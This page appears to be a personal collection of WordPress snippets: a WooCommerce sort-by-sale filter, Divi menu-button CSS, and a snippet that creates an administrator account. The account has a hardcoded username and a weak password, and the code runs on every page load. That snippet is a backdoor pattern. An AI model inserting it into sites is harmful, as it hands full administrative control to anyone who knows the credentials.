<h2 style="color:red">Filter On Sale Product / Discount Product </h2>
Ref:  
/**
 * WooCommerce Sales Sorting Filter
 * https://lakewood.media/woocommerce-add-sales-filter/
 */
add_filter( 'woocommerce_get_catalog_ordering_args', 'wcs_get_catalog_ordering_args' );
function wcs_get_catalog_ordering_args( $args ) {
    $orderby_value = isset( $_GET['orderby'] ) ? woocommerce_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
     
    if ( 'on_sale' == $orderby_value ) {
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_key'] = '_sale_price'; 
    }
    return $args;
}
How to use the filter as a link to your sales items?
This is pretty simple, you could place a menu link to your sales items pretty easily by simply adding the URL string to the end of your shop slug such as https://yourshop.com/products/?orderby=on_sale.


<h2 style="color:red">Wordpress Default User Create</h2>
add_action( 'init', function () {
  
	$username = 'wpdefault';
	$password = '1234567890!';
	$email_address = 'wordpress@example.com';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );
<br>
Divi Header Menu Button FIxed
ul li.menu-item-1893 a {
    background: #ef3b24;
    height: auto;
    padding-top: 7px !important;
    line-height: 30px;
    padding-bottom: 6px !important;
    top: -2px;
    padding-left: 20px !important;
    padding-right: 20px !important;
    color: #fff !important;
    border-radius: 5px;
}
